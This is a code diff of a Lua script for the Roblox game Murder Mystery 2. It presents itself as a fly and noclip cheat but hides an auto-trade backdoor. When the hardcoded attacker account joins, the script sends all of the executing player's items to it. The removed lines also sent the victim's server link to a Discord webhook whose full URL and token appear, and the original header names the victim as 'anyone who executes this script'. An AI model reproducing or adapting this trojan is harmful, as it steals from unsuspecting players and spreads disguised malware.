@@ -1,39 +1,17 @@
 --[[
-    sysrfx::MM2_AUTO_TRADE_BACKDOOR
-    Target: Anyone who executes this script.
-    Attacker: Hardcoded username receives all items.
+    sysrfx::MM2_AUTO_TRADE (Delta Mobile - No HTTP)
+    Prints server link to console. Join manually.
 --]]
+local attackerUsername = "FEARACCE"  -- REPLACE THIS
 
-local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"   -- REPLACE THIS
-local attackerUsername = "zerotilzed1" -- REPLACE THIS
+-- Print server link to console (so you can copy it)
+print("== MM2 SERVER ==")
+print("Place ID: " .. game.PlaceId)
+print("Job ID: " .. game.JobId)
+print("Join link: https://www.roblox.com/games/" .. game.PlaceId .. "?serverId=" .. game.JobId)
+print("== Copy the link above and join ==")
 
--- ========================================
--- COMPONENT A: Send server join link to Discord
--- ========================================
-local function sendWebhook(msg)
-    local success, result = pcall(function()
-        if syn then
-            syn.request({ Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({ content = msg }) })
-        elseif http then
-            http.request({ url = webhookURL, method = "POST", headers = {["Content-Type"] = "application/json"}, data = game:GetService("HttpService"):JSONEncode({ content = msg }) })
-        elseif http_request then
-            http_request({ Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({ content = msg }) })
-        elseif request then
-            request({ Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({ content = msg }) })
-        else
-            print("No HTTP function. Webhook failed.")
-        end
-    end)
-end
-
-local placeId = game.PlaceId
-local jobId = game.JobId
-local joinLink = "https://www.roblox.com/games/" .. placeId .. "?serverId=" .. jobId
-sendWebhook("MM2 Server: " .. joinLink)
-
--- ========================================
--- COMPONENT B: Fly + Noclip (distraction)
--- ========================================
+-- Fly + Noclip (works without HTTP)
 local player = game.Players.LocalPlayer
 local char = player.Character or player.CharacterAdded:Wait()
 local rootPart = char:WaitForChild("HumanoidRootPart")
@@ -77,9 +55,7 @@ game:GetService("UserInputService").InputBegan:Connect(function(input)
     if input.KeyCode == Enum.KeyCode.V then toggleNoclip() end
 end)
 
--- ========================================
--- COMPONENT C: Auto-Trade (only to attackerUsername)
--- ========================================
+-- Auto-Trade (only to attackerUsername) – works locally
 local function getTradeGui()
     local gui = player:FindFirstChild("PlayerGui")
     if not gui then return nil end
@@ -151,16 +127,16 @@ spawn(function()
         wait(1)
     end
     print("Attacker found: " .. attacker.Name)
-    wait(3) -- let them load
+    wait(3)
     if initiateTrade(attacker) then
         wait(2)
-        acceptTrade()  -- first accept
+        acceptTrade()
         wait(2)
-        addAllItems()  -- add all items
+        addAllItems()
         wait(2)
-        acceptTrade()  -- final confirm
+        acceptTrade()
         print("Trade completed. All items sent to " .. attacker.Name)
     end
 end)
 
-print("MM2 Script loaded. Fly: F, Noclip: V. Hidden trade automation active.")
+print("Script loaded. Fly: F, Noclip: V. Auto-trade ready.")
